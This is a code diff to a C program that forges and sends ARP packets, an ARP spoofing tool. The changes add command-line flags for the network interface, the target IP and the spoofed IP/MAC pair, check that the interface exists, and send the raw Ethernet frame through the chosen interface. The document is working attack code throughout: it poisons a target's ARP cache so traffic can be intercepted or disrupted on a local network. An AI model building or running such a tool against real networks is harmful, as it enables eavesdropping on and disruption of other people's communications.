@@ -28,6 +28,7 @@ Version 1.1 : Add Control Operatior (-t , -s)
 #include <string.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
@@ -57,6 +58,13 @@ struct ARP_header
 	unsigned char	TargetHardareAddr[6] ;
 	unsigned char	TargetProtocolAddr[4] ;
 };
+
+//--------------------------------------------------------------------------
+// system flag
+int Pass_flag =0 ;	// -P , pass data format resolution check
+int I_flag =0 ;		// -i , interface flag
+int S_flag =0 ;		// -s , spoofing
+int T_flag =0 ;		// -t , Target IP flag
 //--------------------------------------------------------------------------
 // **************************************
 // MAC address format check function
@@ -192,15 +200,27 @@ int main(int argc, char* argv[])
 
 	int opt;
 	// opterr =0; //  disable getopt error message
-	while((opt=getopt(argc, argv, "i:t:s:")) != -1)
+	while((opt=getopt(argc, argv, "Pi:t:s:")) != -1)
 	{
 	    switch(opt)
 	    {
 		case 'i': // interface
 		{
-		    int ilen =strlen(optarg);
-		    if(ilen<16)
-			memcpy(NetInterface ,optarg ,sizeof(char)*ilen);
+		    int iLen =strlen(optarg);
+		    if(iLen<16)
+		    {
+			char ifPath[256]="/sys/class/net/";
+			strcat(ifPath ,optarg);
+			strcat(ifPath ,"/address");
+			struct stat buf;
+			if(stat(ifPath,&buf) == 0)
+ 			{
+			    I_flag  =1 ;
+                            memcpy(NetInterface , optarg ,sizeof(char)*iLen);
+			}
+			else
+			    printf(P_RED "Error" P_NONE ": Unknow interface : [" P_GREEN "%s" P_NONE "]\n",optarg);
+		    }
 		    else
 			printf(P_RED "Error" P_NONE ": Interface identify size unmatch , please fix source code\n");
 		}
@@ -210,7 +230,10 @@ int main(int argc, char* argv[])
 		{
 		    unsigned int tTarget_IP = inet_addr(optarg);
 		    if(tTarget_IP !=-1)
+		    {
+			T_flag =1 ;
 			memcpy(Target_IP , &tTarget_IP ,sizeof(int));
+		    }
 		    else
 			printf(P_RED "Error" P_NONE ": Target IP [" P_GREEN "%s" P_NONE "] ,format resolution failed \n",optarg);
 		}
@@ -220,14 +243,27 @@ int main(int argc, char* argv[])
 		{
 		    if(Arg_s_Resolution(optarg ,(char*)&Spoofing_IP[0] ,(char*)&Spoofing_MAC[0] )==0)
 			printf(P_RED "Error" P_NONE ": Spoofing data resolution failed\n");
+		    else
+			S_flag =1;
 	        }
 		break;
-
+		case 'P':
+		{
+		    Pass_flag =1;
+		}
+		break ;
 		default :
 		    printf(P_RED "Error" P_NONE ":Unkonw Argument\n!");
 		break ;
     	    }
 	}
+
+	if(I_flag ==0 || S_flag ==0 || T_flag ==0)
+	{
+	    printf("ARP_Spoofing Error\n");
+	    exit(-1);
+	}
+
 
 	unsigned int tSoruce_IP      = inet_addr("192.168.0.4");
         unsigned int tSpoofing_IP    = inet_addr("192.168.0.6");
@@ -271,17 +307,18 @@ int main(int argc, char* argv[])
 	}
         printf("Successfully\n");
 
+	// Get Interface ibdex
 	struct sockaddr_ll device;
-	if ((device.sll_ifindex = if_nametoindex ("eth0")) == 0)
+	if ((device.sll_ifindex = if_nametoindex ((const char*)NetInterface)) == 0)
 	{
  	    printf("if_nametoindex() failed to obtain interface index ");
     	    exit (EXIT_FAILURE);
   	}
 	printf ("Index for interface %s is %i\n", "eth0", device.sll_ifindex);
-
 	device.sll_family = AF_PACKET;
   	device.sll_halen = htons (6);
 
+	// Send packet to NIC
 	if (sendto (ARPSocket, EthernetFrame, 42, 0, (struct sockaddr *) &device, sizeof (device)) <= 0)
 	{
 	    perror ("sendto() failed");
